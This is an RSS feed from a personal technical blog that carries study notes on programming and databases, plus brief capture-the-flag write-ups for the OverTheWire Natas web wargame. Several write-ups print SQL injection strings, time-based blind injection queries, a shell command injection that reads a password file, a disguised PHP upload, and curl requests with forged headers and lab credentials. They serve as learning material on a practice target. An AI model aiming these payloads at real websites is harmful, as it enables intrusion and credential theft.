<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Down the wabbit's hole</title><link>https://www.dinudev.com/</link><description>Recent content on Down the wabbit's hole</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 26 Jan 2023 12:00:00 +0000</lastBuildDate><atom:link href="https://www.dinudev.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Bash to Python</title><link>https://www.dinudev.com/post/bash_to_python/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/bash_to_python/</guid><description>Topics: reading and writing files: cli reads files line-by-line and does some action to that line when processing stdin data, cli expects a stream of text divided by newline(file-like object) open: file path mode: r: read only w/w+: write only a/a+: append with open(&amp;#39;/file/path.txt&amp;#39;) as f: for line in f: print(line.strip()) cli interfaces: handling piping(stdin, stdout, stderr) stdin import sys for line in sys.stdin: print(line) stdout: print / sys.stdout.write('Out\n') stderr: sys.</description></item><item><title>Code Review</title><link>https://www.dinudev.com/post/code_review/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/code_review/</guid><description>high level code review checklist: Does the actual implementation reflect the architecture? Is the code easy to understand? Is the code too long? Is cohesion in place? Is the code modular? Are components cohesive? Is the code loosely coupled? Is the code reusable? Is the code readable? Is the code easy to maintain and test? Are premature optimizations in place? Is composition preferred? Is inheritance properly used? Is the flow easy to understand?</description></item><item><title>Containers</title><link>https://www.dinudev.com/post/containers/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/containers/</guid><description>docker: image-spec [] runtime-spec runc containerd moby oci image: info: a description of one or more root fs changes and commands to be run in a container runtime a layer does not have metadata, only content metadata such as env variables or default arguments belong to the image as a whole image json description structure: date created author arch os os.version os.features variant runtime configuration: user exposed ports env entrypoint default arguments(cmd) volumes working dir labels stop signal networking layers: an array of hashes that will make up the runtime fs changing any data in the json description, it will change the ImageId, creating a derived image an image&amp;rsquo;s ImageID is a sha256 of its json description structure: image manifest: metadata of contents and dependencies for a single image for an architecture for an operating system main purpose: content-addresable images: hash the content and use the hash as an id to directly address that version of image multi-architecture images: contain references to manifests for specific platforms(image index) can be translated to a runtime configuration image index(optional): high-level manifest that points to other manifests that usually help in building for different platforms a list of image manifests for different configurations/platforms image configuration: app arguments environment variables one or more fs serializations: data that will be pointed by an image manifest deserialized by the runtime layers(changesets): info: a set of changes is tarred when applying the changeset: if there are no whiteouts, the tar is simply extracted on top of the root fs, esentially adding/modifying files if there are whiteouts, the tar is applied, rather than simply extracted every layer is contained in a directory named for its digest(CAS) stored as: tar tar gzipped tar zstd(compressed with zstd) change types: addition modification removal: an empty file, signifying it should be deleted a whiteout a file that has a name of .</description></item><item><title>DB design for mere mortals</title><link>https://www.dinudev.com/post/db_design_for_mere_mortals/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/db_design_for_mere_mortals/</guid><description>relational db design: relational db: what is a database?: a collection of structured data, used to model a system&amp;rsquo;s process organised data for a specific purpose types of dbs? operational vs analytical databases: operational: dbs where data changes often(daily) and fresh changes need to be available almost instantly analytical: dbs where change happens rarely and are mainly used to model trends, extract statistics or archive data what is a relational database?</description></item><item><title>Design Patterns</title><link>https://www.dinudev.com/post/design_patterns/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/design_patterns/</guid><description>factory: a method to create objects that follow an interface, this way the user does not care what object is created and how, it simply calls the interface&amp;rsquo;s methods const ( Cash := 1 DebitCard := 2 ) type Payment interface { func Pay(sum int) (string, error) } type CashPM struct {} func (*c CashPM) Pay(sum int) string { return &amp;#34;&amp;#34;, nil } type DebitCardPM struct {} func (*c DebitCardPM) Pay(sum int) string { return &amp;#34;&amp;#34;, nil } func getPayment(t int) (Payment, error) { switch t { case Cash: return new(CashPM), nil case DebitCard: return new(DebitCardPM), nil default: return nil, errors.</description></item><item><title>Electronics</title><link>https://www.dinudev.com/post/electronics/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/electronics/</guid><description>structure: circuit analysis: basic static circuits made up of independent/controlled sources and resistors analog electronics: active and non-linear elements: diodes transistors calculus: differential equations laplace fourier transforms digital electronics: easier to learn because they lack much math ohm and kirchhoff are enough to start buy a microcontroller(arduino/raspberry pi) books: https://www.allaboutcircuits.com/textbook/ https://www.electronics-tutorials.ws/ https://archive.org/search.php?query=creator%3A%22United%20States.%20Navy%22%20neets&amp;amp;and[]=subject%3A%22The+Navy+Electricity+and+Electronics+Training+Series%22 Getting Started in Electronics mims pre requisites: math: algebra: linear equations calculus: integration derivative integral Taylor series physics: electricity magnetism electrostatics potential energy voltage capacitance microcontroller breadboard: simple to intermediate circuits soldering skills foundations: voltage(V or E): cost of energy required to move a unit of positive charge from lower potential point to the higher potential point voltage is what you apply to cause currents to flow [!</description></item><item><title>HTTPd</title><link>https://www.dinudev.com/post/httpd/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/httpd/</guid><description>mpm modules: prefork: misc: a master mantains a pool of children a bunch of children are forked from parent at the start of the parent the parent aims to have a few idle children, always ready to handle new requests children(workers) are forked as needed up to a MaxRequestWorkers number the children handle the requests worker: misc: same as prefork but each children handles a bunch of threads: 1 listener thread: listen for new connections and pass the request to a server thread multiple server threads: process the connection number of processes started is specified by StartServers, MinSpareThreads, MaxSpareThreads number of active child processes is MaxRequestWorkers / ThreadsPerChild: MaxRequestWorkers: total workers per httpd server ThreadsPerChild: threads per process(workers) event: misc: based on worker listener threads handle server threads scheduling a long-lived connection is passed to the listener that will only pass it back to a server thread if an event that allows further processing is send by the os for the connection blocking connections are passed from the workers to the listener until they unblock, when the unblocking event happens, the listener picks an idle worker and gives the connection for further processing thread workload concurrency with listener as a scheduler and workers modules: misc: me modules are staticly compiled with apache binary other modules are specified in the config with LoadModule and loaded at runtime after a restart as shared libraries types: static: core http shared: everything else default modules: mod_mpm_event: mpm event mod_authn_core: provides management of basic auth and http digest(?</description></item><item><title>Linear Algebra</title><link>https://www.dinudev.com/post/linear_algebra/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/linear_algebra/</guid><description>syllabus: vectors and dot products matrix algebra subspaces(fundamental theorem of linear algebra) least squares determinants, cramer&amp;rsquo;s rule eigenvalues singular values and singular vectors linear transformation complex vectors and matrices, fast fourier transform applications of things learned ties to computation aplications in probability and statistics</description></item><item><title>MySQL</title><link>https://www.dinudev.com/post/mysql/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/mysql/</guid><description>concepts: locking: when making changes to data, a lock is aquired that prevents any read or write until the transaction finishes and the lock is released if succesfull data is updated, the other transactions in the queue get to use the new data if failed the other transactions in the queue get to use the initial data in non-trivial systems this can be slow, because every transaction in the queue needs to wait for the others in front to finis, making the process sequential multiversion concurency control: the system gives the readers the initial data, while the transaction is still ongoing(not fully commited) write-ahead-logging(WAL): a copy of the instructions needed for the change are first written to a safe log, THEN the actions are done on crash, a recovery to a stable state is made by reverting to a known valid checkpoint and a recovery of the invalid actions is redone from the WAL examples: journaling in fs transactions in db shadow paging: a page is a fixed size blob that contains data when starting a transaction, a page is created and only pointed to by the transaction manager, when the transaction is completed, the pointer to the old page is changed with the pointer to the new page, if the transaction failed, the shadow page is simply deleted myisam2innodb: [] every table should have a primary key [] innodb can have deadlocks even if there are no transactions common: b-tree index full-text searches myisam: lock: table cache: only keys (by loading the .</description></item><item><title>mysqldump</title><link>https://www.dinudev.com/post/mysqldump/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/mysqldump/</guid><description>mysql: to drop a table and ignore foreign key errors, use ALTER TABLE &amp;lt;name&amp;gt; DISABLE KEYS when inserting multiple rows, if one row is invalid, no rows are inserted, to insert only valid ones and ignore errors from invalid ones use INSERT IGNORE INTO &amp;lt;table&amp;gt; ... mysqldump: --all-databases / -A --databases / -B: specified names are treated as db names --tables / -T: specified names are treated as table names, overrides -B --no-create-db / -n: don&amp;rsquo;t add CREATE DATABASE .</description></item><item><title>PHPUnit</title><link>https://www.dinudev.com/post/phpunit/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/phpunit/</guid><description>phpunit cli-xml equivalents: Test Selection Options: &amp;ndash;filter Filter which tests to run &amp;ndash;testsuite Filter which testsuite to run &amp;ndash;group Only runs tests from the specified group(s) &amp;ndash;exclude-group Exclude tests from the specified group(s) &amp;ndash;list-groups List available test groups &amp;ndash;list-suites List available test suites &amp;ndash;list-tests List available tests &amp;ndash;list-tests-xml List available tests in XML format &amp;ndash;test-suffix Only search for test in files with specified suffix(es). Default: Test.php,.phpt Test Execution Options: &amp;ndash;dont-report-useless-tests phpunit-beStrictAboutTestsThatDoNotTestAnything</description></item><item><title>Python</title><link>https://www.dinudev.com/post/python/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/python/</guid><description>generators: yield: the equivalent of return for a generator flow: when you call a function with yield the value returned is a type of iterator, a generator every time you iterate through a generator(in a for-loop or calling .next()) the generator executes until it reaches an yield, returns the yield-ed value and pauses if a iterator arrives at the end, it is exhausted builtin constants: False True None NotImplemented builtin functions: primitives: ascii(): get input as ascii bin() bool() bytearray() bytes() chr() dict() float() hex() int() list() object(): base object for every entity in python oct() ord() set() slice() str() tuple() iterable related: enumerate(): return an enumerate object from iterable filter(): filter iterable by provided function map(): return iterator that applies provided function to every item of iterable sum() max() min() next(): get next() item from iterator range() misc: @classmethod(): a decorator for a class method @staticmethod(): a decorator for a static method @abstractmethod(): a decorator for an abstract method dir(): get names from input globals(): get all variables from the current module scope locals(): get all variables from the current scope hash(): get a unique hash, to be used when searching for a key in a dictionary help(): will search for input in official docs id(): unique id of the item input(): read input from cli abs() isinstance() issubclass() len() open(): open file pow() print() property() repr(): get a string representation of input, it strives to generate a representation to be used by eval reversed(): get a reverse iterator from interable round() sorted() super() type() vars(): get dict of input sets: .</description></item><item><title>Redis</title><link>https://www.dinudev.com/post/redis/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/redis/</guid><description>misc: in-memory key-value db values are primitive data structures is backed on disk at specified time intervals or when certain rules are met single-threaded the only size limitation is the available memory keys are binary safe: max key size: 512MB max value size: 512MB operations: modifiers: set: ex: set k v ex(expire in s seconds): set k v ex s ex(expire in ms milliseconds): set k v px ms del: info: return 1 or 0 ex: del k expire: info: set expiration in s ex: expire k s pexpire: info: set expiration in ms ex: pexpire k ms persist: info: remove expire time from a key ex: persist k incr: info: interpret value as int, increment and set ex: incr k incrby: ex: incrby k n decr decrby: ex: decrby k n queries: get: get k exists: info: return 1 or 0 ex: exists k type: info: returns the type of the value at key ex: type k ttl: info: get seconds left until key expires ex: ttl k pttl: info: get milliseconds left until key expires ex: pttl k multi-key: mset: ex: mset k1 v1 k2 v2 k3 v3 mget: info: returns an array ex: mset k1 k2 k3 list: lpush: info: push a number of elements at the head ex: lpush k 2 1 =&amp;gt; 1, 2 ex: lpush k 100 150 =&amp;gt; 150, 100 rpush: info: push a number of elements at the tail ex: rpush k 3 4 =&amp;gt; 3, 4 ex: rpush k 100 150 =&amp;gt; 100, 150 lrange: info: list elements between specified range limits n and m lrange k n m =&amp;gt; &amp;gt;= n &amp;amp;&amp;amp; &amp;lt;= m ex: lrange k n m llen: ex: llen k lpop: info: pop from k head, optionally n elements ex: lpop k [n] rpop: info: pop from k tail, optionally n elements ex: rpop k [n] set: smembers: info: get all members ex: smembers k sadd: ex: sadd k v1 v2 vn sismember: info: check if value is in set return 1 or 0 ex: sismember k v sinter: info: a inner join between two sets returns another set ex: sinter k1 k2 sinterstore: info: a inner join between two sets returns another set and saves it in dest ex: sinterstore dest k1 k2 scard: info: number of members in set ex: scard k srem: info: remove members return number of members removed ex: srem k v1 v2 vn set: hset: ex: hset k f1 v1 f2 v2 fn vn hget: ex: hget k f hmget: ex: hmget k f1 f2 fn hkeys: ex: hkeys k hvals: ex: hvals k hlen: info: number of keys ex: hlen k hexists: info: check if field exists in key return 1 or 0 ex: hexists k f hdel: ex: hdel k f1 f2 fn data structures: strings: misc: a sequence of bytes types: text serialized objects binary arrays lists: misc: a sequence of ordered elements they are implemented as linked lists: access: O(n) add at head: O(1) add at tail: O(1) if accessing at the middle is important, use sorted sets sets hashes sorted sets streams geospatial hyperlog bitmaps bitfields</description></item><item><title>Refactoring</title><link>https://www.dinudev.com/post/refactoring/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/refactoring/</guid><description>reasons to change software: adding a feature fixing a bug improving a design optimizing resource usage when making changes, it is all about behaviour: new behaviour(features) changing or removing old behaviour(bugs) variants in a system when making a change: structure
functionality
resource usage
when making a change is important to know how much other behaviour is at risk
risk-mitigation: what changes do we have to make? how will we know that we&amp;rsquo;ve done them correctly?</description></item><item><title>Regexp</title><link>https://www.dinudev.com/post/regexp/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/regexp/</guid><description>types: BRE(Basic Regular Expressions): ^, ., [], [^ ], $, * \?, \|, \+, \(\), \{m,n\} \?: \{0,1}\ \*: \{0,}\ \+: \{1,}\ ERE(Extended Regular Expressions): some meta characters do not need escaping: ?, |, +, (), {m,n} posix character classes: [:alnum:]: [A-Za-z0-9] [:alpha:]: [A-Za-z] [:blank:]: [ \t] [:digit:]: [0-9] [:lower:]: [a-z] [:print:]([:graph:] + space): [\x20-\x7E] [:punct:](punctuation characters): [][!&amp;quot;#$%&amp;amp;'()*+,./:;&amp;lt;=&amp;gt;?@\^_\``{\}~-] [:space:]: [ \t\r\n\v\f] [:upper:]: [A-Z] [:xdigit:](hexadecimal digits): [A-Fa-f0-9] [:graph:](visible characters/graphical): [\x21-\x7E]: 21: !</description></item><item><title>Rest API</title><link>https://www.dinudev.com/post/rest_api/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/rest_api/</guid><description>rest api: write a bit of client code before design and implementation(readable code from a api, means the api is well written), it will force you to keep the client&amp;rsquo;s perspective and will give you a starting point makes easy things easy and hard things possible !!!!! take into account the use-cases and the public of you api never start implementation before design watch out for leakage of implementation details into the api, interfaces outlive implementations ask for constant feedback, try dogfooding name consistently name should be a bit specific, it is hard to reclaim api real-estate hard to misuse, sane defaults(false by default and enabled by the user) property-based instead of providing all the params in the constructor fundamentals of api design what is api design?</description></item><item><title>Sqlite</title><link>https://www.dinudev.com/post/sqlite/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/sqlite/</guid><description>types of file formats: file format: store a single object application format: store multiple objects types of application formats: custom: custom opaque blobs of data that can only be interpreted by a particular application pile-of-files: the application uses the fs as a key/value database one root dir with multiple children that can contain other dirs or files the file paths are the keys and the file contents are the values wrapped pile-of-files: a pile-of-files wrapped in a container(zip, tar, etc) data types: sqlite has no data types: creating a table does not require data types for columns, ex: CREATE TABLE example(col1, col2, col3) when inserting a different data type, sqlite first tries to convert to proper type sqlite will store the data, making datatypes essentially recommandations, not requirements!</description></item><item><title>Statistics</title><link>https://www.dinudev.com/post/stat/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/stat/</guid><description>Trends - A trend is defined as a pattern of change. sns.lineplot - Line charts are best to show trends over a period of time, and multiple lines can be used to show trends in more than one group. Relationship - There are many different chart types that you can use to understand relationships between variables in your data. sns.barplot - Bar charts are useful for comparing quantities corresponding to different groups.</description></item><item><title>Tests</title><link>https://www.dinudev.com/post/tests/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/tests/</guid><description>unit test(london): automated verifies a small piece of code(a unit) does it quickly does it in an isolated manner unit test(classical): automated verifies a small piece of behaviour(a unit) does it quickly does it in isolation(from other tests) integration test: does not follow one(any) or more ut criteria it involves two or more units schools of tought: classical: if you test an unit, you are implicitly testing its dependencies london: all colaborators(shared or mutable dependency) are mocked, this way only SUT is tested caracteristics of unit tests(these can be run after every code line change): they run fast they help us localize errors NOT unit tests(these can be run at larger intervals): talks to the db communicates across the network uses the fs you need to edit the environment(ex: config files) to run them philo: london allows you to build outside-in: start from high-level tests that set expectations for the whole system continue to write tests for every SUT in the graph of dependencies(mocks allows this) classical forces you to start inside-out: starting from the domain model you test and build out until the user facing SUTs cons: london: if you mock every collaborator, the tests end up more coupled unit test structure: 3a(aaa): arrange: setup SUT and collaborators in a desired state act: execute the behaviour and capture the output assert: assert the output and state is the expected one 3a is usually written starting with arrange, but it is easier to start with assert, because you do not yet know the behaviour, just the desired outcome recommendations: make shared fixtures only when all or almost all tests will use them(ex: DB connection): you might duplicate the same arrange for multiple tests, but this will make the tests self-sustaining and more readable if you do not want duplication, create private factory methods to be used in arrange name the test as if you were describing to a domain expert or business analyst each test is a fact about the behaviour of the SUT code smell: multiple or intertwined aaa sections in the same test means its not an unit test(tests more than one unit) an if in a test means it verifies too many things at once(not an unit test) if act is larger than 2-3 lines or larger than assert, there might be a problem with the SUT API if assert is too big it might signify a missing abstraction in the SUT API misc: ideal unit test: because of the CAP theorem ideal tests are unatainable if you focus on maxing any two facets, the last one will be useless, thus making the whole test useless it is impossible to achieve a perfect score in all four attributes because the three &amp;ldquo;protection against regressions&amp;rdquo;, &amp;ldquo;resistance to refactoring&amp;rdquo; and &amp;ldquo;fast feedback&amp;rdquo; are mutually exclusive, meaning only two of the three can have perfect scores &amp;ldquo;resistance to refactoring&amp;rdquo; is non-negociable because is binary, you either have resistance to refactoring or you don&amp;rsquo;t a &amp;ldquo;slider&amp;rdquo; moves the importance between &amp;ldquo;fast feedback&amp;rdquo; and &amp;ldquo;protection against regressions&amp;rdquo; based on context, because the two are more malleable than &amp;ldquo;resistance to refactoring&amp;rdquo;: e2e: more towards &amp;ldquo;regressions&amp;rdquo; integration: middle point unit: faster than any other attributes: integrated into the development lifecycle targets only the most important parts of the codebase provides maximum value with minimum maintenance costs test pyramid: many unit tests, highly abstract medium amount of integration tests, more human low amount of end-to-end tests, closest to emulating a user if you have very few business rules or any other complexity, e2e are redundant or useless if you do not have algorithmic complexity or business complexity, many unit tests are useless because they quickly delve in trivial checks black-box vs white-box testing: black-box(what): used based on a specification use when writing tests white-box(how): derived from source code, not a specification more thorough, but more brittle(tight coupling) tend to produce more false positives use when analysing tests a test against a behaviour that is not meaningful to a business person lacks value and is fragile decoupling means testing the observable behaviour(the end results), not the steps to do that maximising test accuracy: by decreasing the false positives(the test is flexible to refactoring) and decreasing the false negatives(the test is good against regression), the accuracy of the test increases set a high value threshold for tests and only allow tests above that value in the codebase, test code is also code and less good code is better than more mediocre code: value = [0.</description></item><item><title>Thread Modeling</title><link>https://www.dinudev.com/post/threat_modeling/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/threat_modeling/</guid><description>1. getting started: STRIDE DREAD The OPSEC Process
OPSEC is a five step, iterative process designed to assist in identifying information (or persons, property, etc) requiring protection, determining the methods that may be employed to compromise that information (or person, property, etc), and establishing effective countermeasures to protect it.
When formally applied, OPSEC is generally conducted in a sequential manner. However, emergency and dynamic situations may require certain steps be conducted out of sequence.</description></item><item><title>Webpack</title><link>https://www.dinudev.com/post/webpack/</link><pubDate>Thu, 26 Jan 2023 12:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/webpack/</guid><description>webpack: info: highly flexible(and complex) asset bundler concepts: entry: module entrypoints dependency tree roots output: output paths of bundles for every module in entry loader: webpack can only handle js and json files, loaders help webpack interact with other types of files as if they where js modules, esentially extending the dependency graph to include other types of files structure: test: what files to match use: what loader to use on matched files plugins: custom js code that extends the functionality of webpack to that of a task runner, potentially ANY computable task, because js is turing complete mode: enable optimizations based on environment values: development: DefinePlugin: define constants at compile time, that can be used in the scripts at runtime &amp;ldquo;process.</description></item><item><title>OTW Natas14</title><link>https://www.dinudev.com/journey/otw_natas14/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas14/</guid><description>steps: sqlinjection: user: 1 pass: 1&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1 lessons:</description></item><item><title>OTW Natas15</title><link>https://www.dinudev.com/journey/otw_natas15/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas15/</guid><description>steps: lessons:</description></item><item><title>OTW Natas16</title><link>https://www.dinudev.com/journey/otw_natas16/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas16/</guid><description>steps: [: start condition ;: multiple commands on the same line |: pipe to next command &amp;amp;: run two commands ': single quote &amp;quot;: double quote blind bash injection, you can inject a string in the regex that results from a bash subshell result doomed$(grep a /etc/natas_webpass/natas17) lessons:</description></item><item><title>OTW Natas18</title><link>https://www.dinudev.com/journey/otw_natas18/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas18/</guid><description>steps: blind sql injection, by asking binary questions select * from users where username=&amp;quot;natas18&amp;quot; and password binary like &amp;quot;%a%&amp;quot; and sleep(2)--, if the request duration is longer than 2 seconds(the sleep triggered), it means the leter is contained in the password after gathering all the containing characters, select * from users where username=&amp;quot;natas18&amp;quot; and password binary like &amp;quot;a8n5%&amp;quot; and sleep(2)--, find the password(incrementally) starting from the first letters, based on the found containing characters lessons:</description></item><item><title>OTW Natas19</title><link>https://www.dinudev.com/journey/otw_natas19/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas19/</guid><description>steps: lessons: 3335332d61646d696e 3 62d61646d696e 3 4312d61646d696e 3539372d61646d696e 3133302d61646d696e 3237392d61646d696e 3338352d61646d696e 3439302d61646d696e 3533302d61646d696e 3231342d61646d696e
curl &amp;lsquo;http://natas19.natas.labs.overthewire.org/index.php' -X POST -H &amp;lsquo;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0&amp;rsquo; -H &amp;lsquo;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&amp;rsquo; -H &amp;lsquo;Accept-Language: en,en-US;q=0.7,en-GB;q=0.3&amp;rsquo; -H &amp;lsquo;Accept-Encoding: gzip, deflate&amp;rsquo; -H &amp;lsquo;Referer: http://natas19.natas.labs.overthewire.org/index.php?debug=1' -H &amp;lsquo;Content-Type: application/x-www-form-urlencoded&amp;rsquo; -H &amp;lsquo;Origin: http://natas19.natas.labs.overthewire.org&amp;rsquo; -H &amp;lsquo;DNT: 1&amp;rsquo; -H &amp;lsquo;Authorization: Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==&amp;rsquo; -H &amp;lsquo;Connection: keep-alive&amp;rsquo; -H &amp;lsquo;Cookie: __utma=176859643.325646147.1664460162.1664460162.1664460162.1; __utmc=176859643; __utmz=176859643.1664460162.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)&amp;rsquo; -H &amp;lsquo;Upgrade-Insecure-Requests: 1&amp;rsquo; &amp;ndash;data-raw &amp;lsquo;username=admin&amp;amp;password=admin&amp;rsquo;</description></item><item><title>OTW Natas0</title><link>https://www.dinudev.com/journey/otw_natas0/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas0/</guid><description>steps: check page source, the flag is present in a comment</description></item><item><title>OTW Natas1</title><link>https://www.dinudev.com/journey/otw_natas1/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas1/</guid><description>steps: on the body tag there is an event on right-click(context menu) that returns false, blocking you from trying to inspect the page try other ways to see the source: F12, CTRL+u, etc read the page source, the flag is present in a comment</description></item><item><title>OTW Natas10</title><link>https://www.dinudev.com/journey/otw_natas10/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas10/</guid><description>steps: exactly the same setup as natas9, but this time there is a weak filtering on user input /[;|&amp;amp;]/ we will try to hunt for /etc/natas_webpass/natas11 at the same time circumventing the filter, the filter denies the use of: ;: multiple commands on the same line |: piping &amp;amp;: sending a process to the background if we are stuck with the current grep, we can exploit the fact that grep can search through multiple files by aiming for a grep of the entire contents of multiple files(grep -i '.</description></item><item><title>OTW Natas11</title><link>https://www.dinudev.com/journey/otw_natas11/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas11/</guid><description>steps: page source shows there are 4 main logic parts: encrypt some data using xor encryption 1 load the data from a cookie data store an array to the same data cookie if showpassword is yes, show the flag to show the flag we need showpassword set to yes: we can&amp;rsquo;t modify the default data the default data is overwriten by the data in the data cookie we need to write a script that uses an array with &amp;ldquo;showpassword&amp;rdquo; set to &amp;ldquo;yes&amp;rdquo;,</description></item><item><title>OTW Natas12</title><link>https://www.dinudev.com/journey/otw_natas12/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas12/</guid><description>steps: we once again get access to the source code the source has a bunch of logic but the only usefull one is the big if/else at the end and makeRandomPathFromFilename in the if at the end a filepath is generated starting from the file input value,
the file uploaded is checked to be bellow a certain size,
if the check passes the uploaded file is copied in the generated filepath.</description></item><item><title>OTW Natas13</title><link>https://www.dinudev.com/journey/otw_natas13/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas13/</guid><description>steps: this is 90% like natas12, the difference is that exim_imagetype is used on the uploaded file,
to check if the file is a image file the solution I found is to play around with mime-type checking 1 and camouflage the img.php file in some other mime-type, such as a jpeg the camouflage, for jpeg in particular, meant I should just add a few magic bytes to the start of the file: ff d8 ff e0 generate the fake jpeg 23 and follow the natas12 flow to upload the file and get the contents of natas14 file lessons: always mime-check uploaded files almost always uploaded files are data, so store them in data folders and</description></item><item><title>OTW Natas2</title><link>https://www.dinudev.com/journey/otw_natas2/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas2/</guid><description>steps: check the page source the only relevant info in the body is a link to a 1x1 png image going further up the folder to see what other files are there we discover a users.txt that among other users contains the flag lessons: disable autoindex if autoindex is needed, think carefuly what data you might be exposing to the public</description></item><item><title>OTW Natas3</title><link>https://www.dinudev.com/journey/otw_natas3/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas3/</guid><description>steps: check the page source a comment hints that &amp;ldquo;Not even Google&amp;rdquo; will find the flag, the hint refers to the way google indexes websites1 by accessing /robots.txt we see a particular dir is dissalowed(bots shouldn&amp;rsquo;t crawl it), /s3cr3t/ the dir contains a file that contains the flag lessons: making a dir public but dissalowing it does not mean malicious actors (hackers, osint analysts, curious entities, bots that ignore robots.txt) won&amp;rsquo;t access it Google indexes websites by following links from external sites that point to your website(backlinks).</description></item><item><title>OTW Natas4</title><link>https://www.dinudev.com/journey/otw_natas4/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas4/</guid><description>steps: The page says the access is allowed only from natas5 i presume the page reads the referer, so after a quick curl request modeled on the /index.php request from the link in the page1 we get a page that contains the flag lessons: some headers are controlled by the user, don&amp;rsquo;t rely on them: User-Agent Referrer A curl request with the Referer modified to natas5:
curl &amp;#39;http://natas4.natas.labs.overthewire.org/index.php&amp;#39; \ -H &amp;#39;Authorization: Basic &amp;lt;basic_auth_token_here&amp;gt;&amp;#39; \ -H &amp;#39;Referer: http://natas5.</description></item><item><title>OTW Natas5</title><link>https://www.dinudev.com/journey/otw_natas5/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas5/</guid><description>steps: The page says the access is dissalowed because we are not logged in nothing stands out in page source in the requests headers we see a particularly named cookie loggedin with value 0 after changing the value of the cookie to 1 1 and a refresh we get the flag lessons: cookies are used to store state, but their content is fully controlled by the user encrypt cookies ignore invalid cookies Set the cookie to 1:</description></item><item><title>OTW Natas6</title><link>https://www.dinudev.com/journey/otw_natas6/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas6/</guid><description>steps: there is a link that points to the php source code of the page php script includes a certain /includes/secret.inc, then checks if a $secret value is equal to our input if we access the /includes/secret.inc page and check the source we see the variable definition using the value from $secret for the input and we get the flag lessons: don&amp;rsquo;t leave private/internal data in page comments be carefull what endpoints you expose to the internet</description></item><item><title>OTW Natas7</title><link>https://www.dinudev.com/journey/otw_natas7/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas7/</guid><description>steps: by checking the page source we get a hint(a path) from the comment where the flag might be the two links in the page have a page param, that probably specifies the path of the html page to be loaded by trying some random paths as page value we get errors that hits towards a path/directory transversal 1 by using the path in the comments as url param value /index.</description></item><item><title>OTW 